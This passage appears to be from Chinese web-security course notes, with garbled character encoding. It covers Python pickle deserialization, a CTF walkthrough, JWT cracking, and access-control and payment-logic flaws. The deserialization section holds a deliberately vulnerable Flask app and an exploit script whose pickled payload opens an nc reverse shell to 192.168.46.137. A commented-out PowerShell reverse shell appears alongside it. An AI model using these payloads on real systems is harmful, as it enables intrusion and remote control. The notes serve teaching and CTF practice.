<p>ä»£ç å—ï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨-__reduce__() __reduce_ex__() __setstate__()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ååºåˆ—åŒ–è°ƒç”¨&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"><span class="comment">##__reduce__()æ–¹æ³•åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶éƒ½ä¼šè¢«è°ƒç”¨ï¼Œå…¶ä¸­__reduce__()æ–¹æ³•ä¸­éœ€è¦returnæ‰èƒ½è§¦å‘ã€‚</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SerializePerson</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="comment"># æ„é€  __setstate__ æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, name</span>):</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)  <span class="comment"># æ¶æ„ä»£ç </span></span><br><span class="line">tmp = pickle.dumps(SerializePerson(<span class="string">&#x27;tom&#x27;</span>))  <span class="comment">#åºåˆ—åŒ–</span></span><br><span class="line">pickle.loads(tmp)  <span class="comment"># ååºåˆ—åŒ– æ­¤æ—¶ä¼šå¼¹å‡ºè®¡ç®—å™¨</span></span><br><span class="line">ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨__setstate__ï¼ˆï¼‰æ–¹æ³•ï¼Œ__init__() æ–¹æ³•æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå®ƒä¼šåœ¨åˆ›å»ºæ–°å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œ</span><br><span class="line">å¹¶ç”¨äºåˆå§‹åŒ–å¯¹è±¡çš„çŠ¶æ€å’Œæˆå‘˜å˜é‡ã€‚å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç±»çš„æ–°å®ä¾‹æ—¶ï¼Œ</span><br><span class="line">Python è§£é‡Šå™¨ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥ç±»çš„ __init__() æ–¹æ³•ï¼Œå¹¶å°†å®ä¾‹æœ¬èº«ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’ç»™è¯¥æ–¹æ³•ã€‚</span><br><span class="line">å› æ­¤ï¼Œåœ¨å®šä¹‰ __init__() æ–¹æ³•æ—¶ï¼Œéœ€è¦å°†è¯¥æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šä¸º selfï¼Œä»¥ä¾¿å¼•ç”¨å½“å‰å¯¹è±¡çš„æˆå‘˜å˜é‡ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#åºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨-__getstate__</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;åºåˆ—åŒ–è°ƒç”¨&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line">ååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨__getstate__()</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ååºåˆ—åŒ–å®‰å…¨æ¼æ´äº§ç”Ÿ-DEMO</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, func, arg</span>):</span><br><span class="line">        self.func = func</span><br><span class="line">        self.arg = arg</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;This is A&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ååºåˆ—åŒ–è°ƒç”¨&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (self.func, self.arg)</span><br><span class="line">a = A(os.system, (<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line">pickle.loads(p_a) ååºåˆ—åŒ–è¯¥äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶è§¦å‘å…¶ä¸­åŒ…å«çš„ __reduce__() æ–¹æ³•ã€‚</span><br><span class="line">ç”±äºè¯¥æ–¹æ³•ä¸­åŒ…å«äº† self.func(*self.arg) è¯­å¥ï¼Œå› æ­¤åœ¨æ‰§è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œ</span><br><span class="line">Python è§£é‡Šå™¨ä¼šè‡ªåŠ¨è°ƒç”¨ os.system(<span class="string">&#x27;calc&#x27;</span>) å‡½æ•°ï¼Œå¹¶å¼¹å‡ºè®¡ç®—å™¨åº”ç”¨ç¨‹åºã€‚</span><br></pre></td></tr></table></figure>

<p>pythonååºåˆ—åŒ–ä¸åŒäºPHPçš„ä¸€ç‚¹æ—¶ï¼Œæ„é€ åˆ©ç”¨é“¾æ—¶ä¸éœ€è¦ç½‘ç«™æºç å«æœ‰èƒ½è¢«è‡ªåŠ¨è°ƒç”¨çš„é­”æœ¯æ–¹æ³•ï¼Œ<br>åªéœ€è¦åœ¨æ„é€ åˆ©ç”¨é“¾çš„æ—¶å€™è‡ªå·±è°ƒç”¨åˆ©ç”¨é“¾ä¸­çš„é­”æœ¯æ–¹æ³•å³å¯ï¼Œä¹Ÿå°±è¯´pythonæºç ä¸­åªæœ‰è¦pickle.load()ååºåˆ—åŒ–å‡½æ•°å³å¯åˆ©ç”¨</p>
<h4 id="CTF-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ„é€ -RCE"><a href="#CTF-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ„é€ -RCE" class="headerlink" title="#CTF-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ„é€ &amp;RCE"></a>#CTF-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ„é€ &amp;RCE</h4><p>ç¯å¢ƒä»‹ç»ï¼šåˆ©ç”¨Python-askæ­å»ºçš„webåº”ç”¨ï¼Œè·å–å½“å‰ç”¨æˆ·çš„ä¿¡æ¯ï¼Œè¿›è¡Œå±•ç¤ºï¼Œåœ¨è·å–ç”¨<br>æˆ·çš„ä¿¡æ¯æ—¶ï¼Œé€šè¿‡å¯¹ç”¨æˆ·æ•°æ®è¿›è¡Œååºåˆ—åŒ–è·å–å¯¼è‡´çš„å®‰å…¨æ¼æ´ï¼<br>æ€è·¯ï¼šé€šè¿‡åˆ†æç½‘ç«™æºä»£ç å¯çŸ¥ï¼Œç”¨è¿‡æ¥æ”¶cookieä¸­userå‚æ•°çš„å€¼ï¼Œç„¶åå°†å€¼æ‹¼æ¥åˆ°HELLOW ä¹‹åæ˜¾ç¤ºï¼Œ<br>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ„é€ åˆ©ç”¨é“¾ä¼ å‚åˆ°cookieä¸­userå­—æ®µï¼Œå³å¯åˆ©ç”¨<br>ServeræœåŠ¡å™¨ï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">&#x27;192.168.1.3&#x27;</span>,</span><br><span class="line">        port=<span class="number">5000</span>,</span><br><span class="line">        debug=<span class="literal">True</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>hack-flag.pyï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#s = &quot;&quot;&quot;powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;192.168.46.137&quot;,6666); = .GetStream();[byte[]] = 0..65535|%&#123;0&#125;;while(( = .Read(, 0, .Length)) -ne 0)&#123;; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2&gt;&amp;1 | Out-String );  =  + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()&#125;;.Close()&quot;&quot;&quot;</span></span><br><span class="line">        s=<span class="string">&#x27;c:/nc -e cmd 192.168.46.137 6666&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;http://192.168.1.3:5000/&quot;</span>, cookies=<span class="built_in">dict</span>(</span><br><span class="line">    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br></pre></td></tr></table></figure>

<h4 id="CTF-ååŒ—JWT-ååºåˆ—åŒ–"><a href="#CTF-ååŒ—JWT-ååºåˆ—åŒ–" class="headerlink" title="#CTF-ååŒ—JWT&amp;ååºåˆ—åŒ–"></a><strong>#CTF-ååŒ—JWT&amp;ååºåˆ—åŒ–</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é€šè¿‡æç¤º-&gt;å¯»æ‰¾lV6-&gt;è´­ä¹°ä¿®æ”¹æ”¯ä»˜é€»è¾‘-&gt;ç»•è¿‡adminé™åˆ¶éœ€ä¿®æ”¹jwtå€¼&gt;çˆ†è¢«jwtå¯†åŒ™&gt;é‡ç»„</span><br><span class="line">jwtå€¼æˆä¸ºadmin-&gt;è´­ä¹°è¿›å…¥ä¼šå‘˜ä¸­å¿ƒ-&gt;æºç æ‰¾åˆ°æ–‡ä»¶å‹ç¼©æºç -&gt;Pythonä»£ç å®¡è®¡ååºåˆ—åŒ–</span><br><span class="line">&gt;æ„é€‚è¯»å–f1agä»£ç è¿›è¡Œåºåˆ—åŒ–æ‰“å°-&gt;æäº¤è·å–</span><br><span class="line">è€ƒç‚¹1:JWTèº«ä»½éªŒè¯æ”»å‡»ç‚¹ï¼š</span><br><span class="line">https://www.cnblogs.com/vege/p/14468030.html</span><br><span class="line">https://github.com/ck00004/c-jwt-cracker</span><br><span class="line">è€ƒç‚¹2:Pth0nä»£ç å®¡è®¡ååºåˆ—åŒ–ï¼š</span><br><span class="line">è‡ªåŠ¨å·¥å…·ï¼šhttps://github.com/PyCQA/bandit</span><br><span class="line">å‚è€ƒèµ„æ–™ï¼šhttps://github.com/bit4woo/python_sec</span><br></pre></td></tr></table></figure>

<p>æ€è·¯ï¼šæ ¹æ®ç½‘ç«™æç¤ºæ‰¾åˆ°lv6â€“ä½¿ç”¨çˆ¬è™«çˆ¬å–lv6</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line">url=<span class="string">&quot;http://45bc846d-ca58-49a6-812d-de90e99f548d.node5.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;|no&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>ç»•è¿‡adminé™åˆ¶è¯•å›¾ä¿®æ”¹jwtå€¼ï¼Œä½†æ˜¯éœ€è¦å¯¹å¯†é’¥è¿›è¡Œçˆ†ç ´â€“ä½¿ç”¨å·¥å…·çˆ†ç ´åè·å¾—å¯†é’¥IKunâ€“æ„é€ admin jwtå€¼</strong></p>
<p>é¡µé¢å¹¶æ— å…¶ä»–å†…å®¹ï¼Œç‚¹å‡»ä¹Ÿæ— ååº”â€“æŸ¥çœ‹jsä»£ç â€“å«æœ‰ç½‘ç«™æºä»£ç ä¸‹è½½</p>
<p>è¿›è¡Œä»£ç å®¡è®¡â€“å…¨å±€æŸ¥æ‰¾pickle.load()å‡½æ•°â€“æ‰¾åˆ°ååºåˆ—åŒ–ä½ç½®ï¼Œæ„é€ åˆ©ç”¨é“¾</p>
<h4 id="ä»£ç å®¡è®¡-è‡ªåŠ¨åŒ–å·¥å…·bandå®‰è£…åŠä½¿ç”¨"><a href="#ä»£ç å®¡è®¡-è‡ªåŠ¨åŒ–å·¥å…·bandå®‰è£…åŠä½¿ç”¨" class="headerlink" title="#ä»£ç å®¡è®¡-è‡ªåŠ¨åŒ–å·¥å…·bandå®‰è£…åŠä½¿ç”¨"></a>#ä»£ç å®¡è®¡-è‡ªåŠ¨åŒ–å·¥å…·bandå®‰è£…åŠä½¿ç”¨</h4><p>å‚è€ƒï¼š<a href="https://bandit.readthedocs.lo/">https://bandit.readthedocs.lo/</a><br>å®‰è£…ï¼špip install bandit<br>linuxï¼š<br>å®‰è£…åä¼šåœ¨å½“å‰Pythonç›®å½•ä¸‹6in<br>ä½¿ç”¨ï¼šbandit-réœ€è¦å®¡è®¡çš„æºç ç›®å½•<br>windowsï¼š<br>å®‰è£…åä¼šåœ¨å½“å‰Pythonç›®å½•ä¸‹script<br>ä½¿ç”¨ï¼šbandit-réœ€è¦å®¡è®¡çš„æºç ç›®å½•</p>
<h1 id="ç¬¬49å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-ä¸šåŠ¡é€»è¾‘-æ°´å¹³å‚ç›´è¶Šæƒ-è®¿é—®æ§åˆ¶-è„†å¼±éªŒè¯"><a href="#ç¬¬49å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-ä¸šåŠ¡é€»è¾‘-æ°´å¹³å‚ç›´è¶Šæƒ-è®¿é—®æ§åˆ¶-è„†å¼±éªŒè¯" class="headerlink" title="ç¬¬49å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;ä¸šåŠ¡é€»è¾‘&amp;æ°´å¹³å‚ç›´è¶Šæƒ&amp;è®¿é—®æ§åˆ¶&amp;è„†å¼±éªŒè¯"></a>ç¬¬49å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;ä¸šåŠ¡é€»è¾‘&amp;æ°´å¹³å‚ç›´è¶Šæƒ&amp;è®¿é—®æ§åˆ¶&amp;è„†å¼±éªŒè¯</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-29"><a href="#çŸ¥è¯†ç‚¹ï¼š-29" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æ°´å¹³è¶ŠæƒåŒçº§ç”¨æˆ·æƒé™å…±äº«<br>2ã€å‚ç›´è¶Šæƒ-ä½é«˜ç”¨æˆ·æƒé™å…±äº«<br>3ã€è®¿é—®æ§åˆ¶-éªŒè¯ä¸¢å¤±&amp;å–æ¶ˆéªŒè¯<br>4ã€è„†å¼±éªŒè¯-Cookie&amp;Token&amp;Jwtç­‰</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-2"><a href="#å‰ç½®çŸ¥è¯†ï¼š-2" class="headerlink" title="#å‰ç½®çŸ¥è¯†ï¼š"></a>#å‰ç½®çŸ¥è¯†ï¼š</h4><p>1ã€é€»è¾‘è¶ŠæƒåŸç†<br>æ°´å¹³è¶Šæƒï¼šç”¨æˆ·ä¿¡æ¯è·å–æ—¶æœªå¯¹ç”¨æˆ·ä¸Dæ¯”è¾ƒåˆ¤æ–­ç›´æ¥æŸ¥é—´ç­‰<br>å‚ç›´è¶Šæƒï¼šæ•°æ‘†åº“ä¸­ç”¨æˆ·ç±»å‹ç¼–å·æ¥å—ç¼¥æ”¹æˆ–é«˜æƒé™æ“ä½œæœªéªŒè¯ç­‰<br>2ã€è®¿é—®æ§åˆ¶åŸç†<br>éªŒè¯ä¸¢å¤±ï¼šæœªåŒ…å«å¼•ç”¨éªŒè¯ä»£ç æ–‡ä»¶ç­‰<br>å–æ¶ˆéªŒè¯ï¼šæ”¯æŒç©ºå£ä»¤ï¼ŒåŒ¿åç™½åå•ç­‰<br>3ã€è„†å¼±éªŒè¯åŸç†<br>-Cookie&amp;Token&amp;JwM:ä¸å®‰å…¨çš„éªŒè¯è¿ˆæŒ‡ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-26"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-26" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>æƒé™-æ°´å¹³è¶ŠæƒYXCMS-æ£€æµ‹æ•°æ®æ¯”å¯¹å¼±<br>æƒé™-å‚ç›´è¶Šæƒ-MINICMS-æƒé™æ“ä½œæ— éªŒè¯<br>æœªæˆæƒ-è®¿é—®æ§åˆ¶-XHCMS-ä»£ç æœªå¼•ç”¨éªŒè¯<br>æœªæˆæƒ-è„†å¼±æœºåˆ¶-XHCMS-Cookieè„†å¼±éªŒè¯<br>å¼±æœºåˆ¶-ç©ºå£ä»¤æœºåˆ¶-Redis&amp;Weblogicså¼±æœºåˆ¶<br>æ£€æµ‹ç±»-å·¥å…·é¡¹ç›®-Authz&amp;Secscan-Authcheck</p>
<h4 id="æƒé™-æ°´å¹³è¶Šæƒ-YXCMSæ£€æºªæ•°æ®æ¯”å¯¹å¼±"><a href="#æƒé™-æ°´å¹³è¶Šæƒ-YXCMSæ£€æºªæ•°æ®æ¯”å¯¹å¼±" class="headerlink" title="#æƒé™-æ°´å¹³è¶Šæƒ-YXCMSæ£€æºªæ•°æ®æ¯”å¯¹å¼±"></a><strong>#æƒé™-æ°´å¹³è¶Šæƒ-YXCMSæ£€æºªæ•°æ®æ¯”å¯¹å¼±</strong></h4><p>åªæ£€æµ‹ç”¨æˆ·å’ŒIDå¯¹åº”å…³ç³»ï¼Œæ²¡æ£€æµ‹å½“å‰æ“ä½œç”¨æˆ·æ˜¯ä¸æ˜¯å½“å‰ç”¨æˆ·<br>æ€è·¯ï¼šé€šè¿‡æŠ“å–å¯¹æŸä¸€ç”¨æˆ·ä¿®æ”¹èµ„æ–™æ•°æ®åŒ…è¿›è¡Œä¿®æ”¹â€“ä¿®æ”¹ä¸ºå…¶ä»–ç”¨æˆ·ä¸”å˜æ›´èµ„æ–™æ¥å®ç°</p>
<h4 id="æƒé™-å‚ç›´è¶ŠæƒMINICMSæƒé™æ“ä½œæ— éªŒè¯"><a href="#æƒé™-å‚ç›´è¶ŠæƒMINICMSæƒé™æ“ä½œæ— éªŒè¯" class="headerlink" title="#æƒé™-å‚ç›´è¶ŠæƒMINICMSæƒé™æ“ä½œæ— éªŒè¯"></a><strong>#æƒé™-å‚ç›´è¶ŠæƒMINICMSæƒé™æ“ä½œæ— éªŒè¯</strong></h4><p>åå°æ•°æ®åŒ…è®¿é—®å…ˆæ‰§è¡Œååˆ¤æ–­ç™»å½•ç­‰äºæ— æ•ˆ</p>
<h4 id="æœªæˆæƒ-è„†å¼±æœºåˆ¶-XHCMS-Cookieè„†å¼±éªŒè¯"><a href="#æœªæˆæƒ-è„†å¼±æœºåˆ¶-XHCMS-Cookieè„†å¼±éªŒè¯" class="headerlink" title="#æœªæˆæƒ-è„†å¼±æœºåˆ¶-XHCMS-Cookieè„†å¼±éªŒè¯"></a>#<strong>æœªæˆæƒ-è„†å¼±æœºåˆ¶-XHCMS-Cookieè„†å¼±éªŒè¯</strong></h4><p>ä¿®æ”¹æ•°æ®åŒ…ä¸­cookieå­—æ®µä¿¡æ¯ï¼Œæ„é€ userç­‰äºä»»æ„å­—æ®µç›´æ¥ç™»å½•åˆ°åå°ã€‚</p>
<h4 id="å¼±æœºåˆ¶-ç©ºå£ä»¤æœºåˆ¶-Redis-Weblogicså¼±æœºåˆ¶"><a href="#å¼±æœºåˆ¶-ç©ºå£ä»¤æœºåˆ¶-Redis-Weblogicså¼±æœºåˆ¶" class="headerlink" title="#å¼±æœºåˆ¶-ç©ºå£ä»¤æœºåˆ¶-Redis&amp;Weblogicså¼±æœºåˆ¶"></a>#<strong>å¼±æœºåˆ¶-ç©ºå£ä»¤æœºåˆ¶-Redis&amp;Weblogicså¼±æœºåˆ¶</strong></h4><p>redisç›´æ¥ä½¿ç”¨redis-cli.exeè¿æ¥<br>wenlogicè®¿é—®ç‰¹å®šurl</p>
<h4 id="æ£€æµ‹ç±»-å·¥å…·é¡¹ç›®-Authz-Secscan-Authcheck"><a href="#æ£€æµ‹ç±»-å·¥å…·é¡¹ç›®-Authz-Secscan-Authcheck" class="headerlink" title="#æ£€æµ‹ç±»-å·¥å…·é¡¹ç›®-Authz&amp;Secscan-Authcheck"></a>#æ£€æµ‹ç±»-å·¥å…·é¡¹ç›®-Authz&amp;Secscan-Authcheck</h4><p>å®‰è£…è¸©å‘ï¼š<a href="https://bigyoung.cn/posts/250/">https://bigyoung.cn/posts/250/</a><br><a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a>     è¶Šæƒæ£€æµ‹å·¥å…·</p>
<p><a href="https://blog.csdn.net/weixin_44203158/article/details/110007233">https://blog.csdn.net/weixin_44203158/article/details/110007233</a></p>
<h1 id="ç¬¬50å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-è´­ä¹°æ”¯ä»˜é€»è¾‘-æ•°æ®ç¯¡æ”¹-è¯·æ±‚é‡æ”¾-æ¥å£æ›¿æ¢"><a href="#ç¬¬50å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-è´­ä¹°æ”¯ä»˜é€»è¾‘-æ•°æ®ç¯¡æ”¹-è¯·æ±‚é‡æ”¾-æ¥å£æ›¿æ¢" class="headerlink" title="ç¬¬50å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;è´­ä¹°æ”¯ä»˜é€»è¾‘&amp;æ•°æ®ç¯¡æ”¹&amp;è¯·æ±‚é‡æ”¾&amp;æ¥å£æ›¿æ¢"></a>ç¬¬50å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;è´­ä¹°æ”¯ä»˜é€»è¾‘&amp;æ•°æ®ç¯¡æ”¹&amp;è¯·æ±‚é‡æ”¾&amp;æ¥å£æ›¿æ¢</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-30"><a href="#çŸ¥è¯†ç‚¹ï¼š-30" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€å•†å“è´­ä¹°æ•°é‡&amp;ä»·æ ¼&amp;ç¼–å·ç­‰<br>2ã€æ”¯ä»˜æ¨¡å¼çŠ¶æ€&amp;æ¥å£&amp;è´Ÿæ•°ç­‰<br>3ã€æŠ˜æ‰£å¤„ç†-ä¼˜æ‚£åˆ¸&amp;ç§¯åˆ†&amp;é‡æ”¾ç­‰</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-10"><a href="#è¯¦ç»†ç‚¹ï¼š-10" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p>1ã€ç†Ÿæ‚‰å¸¸è§æ”¯ä»˜æµç¨‹<br>é€‰æ‹©å•†å“å’Œæ•°é‡é€‰æ‹©è¯‘æ”¯ä»˜åŠé…é€æ–¹å¼ç”Ÿæˆè®¢å•ç¼–å·è®¢å•æ”¯ä»˜é€‰æ‹©å®Œæˆæ”¯ä»˜<br>2ã€ç†Ÿæ‚‰é‚£äº›æ•°æ®ç®—æ”¹<br>å•†å“ç¼–å·å¼•D,è´­ä¹°ä»·æ ¼ï¼Œè´­ä¹°æ•°é‡ï¼Œæ”¯ä»˜æ–¹å¼ï¼Œè®¢å•å·ï¼Œæ”¯ä»˜çŠ¶æ€ç­‰<br>3ã€ç†Ÿæ‚‰é‚£äº›ä¿®æ”¹æ–¹å¼<br>æ›¿æ¢æ”¯ä»˜ï¼Œé‡å¤æ”¯ä»˜ï¼Œæœ€å°é¢æ”¯ä»˜ï¼Œè´Ÿæ•°æ”¯ä»˜ï¼Œæº¢å‡ºæ”¯ä»˜ï¼Œä¼˜æ‚£åˆ¸æ”¯ä»˜ç­‰</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š"><a href="#ç« èŠ‚å†…å®¹ï¼š" class="headerlink" title="#ç« èŠ‚å†…å®¹ï¼š"></a>#ç« èŠ‚å†…å®¹ï¼š</h4><p>1ã€æƒé™ç›¸å…³è¶Šæƒ&amp;è®¿é—®æ§åˆ¶&amp;æœªæˆæƒè®¿é—®ç­‰<br>2ã€è´­ä¹°æ”¯ä»˜æ•°æ®ç®—æ”¹&amp;æ”¯ä»˜æ¨¡å¼&amp;å…¶ä»–æŠ˜æ‰£ç­‰<br>3ã€ä¸‹èŠ‚è¯¾<br>4ã€ä¸‹èŠ‚è¯¾</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-27"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-27" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ïƒ˜ æ•°æ®ç¯¡æ”¹-ä»·æ ¼&amp;æ•°é‡&amp;äº§å“</p>
<p>ïƒ˜ ä¿®æ”¹æ–¹å¼-è®¢å•å·&amp;æ•°é‡&amp;ä¼˜æƒ åˆ¸</p>
<p>ïƒ˜ æŸå®ä¾‹-æ¼”ç¤ºç«™äº¤æ˜“æ”¯ä»˜é€»è¾‘å®‰å…¨</p>
<p>ïƒ˜ ä»£ç å®¡è®¡-ä¸šåŠ¡æ”¯ä»˜é€»è¾‘&amp;å®‰å…¨ä¿®å¤</p>
<h4 id="æ•°æ®ç¯¡æ”¹-ä»·æ ¼-æ•°é‡-äº§å“"><a href="#æ•°æ®ç¯¡æ”¹-ä»·æ ¼-æ•°é‡-äº§å“" class="headerlink" title="#æ•°æ®ç¯¡æ”¹-ä»·æ ¼&amp;æ•°é‡&amp;äº§å“"></a>#æ•°æ®ç¯¡æ”¹-ä»·æ ¼&amp;æ•°é‡&amp;äº§å“</h4><p>1ã€ä¿®æ”¹æ•°é‡è¾¾åˆ°ä»·æ ¼å˜åŠ¨</p>
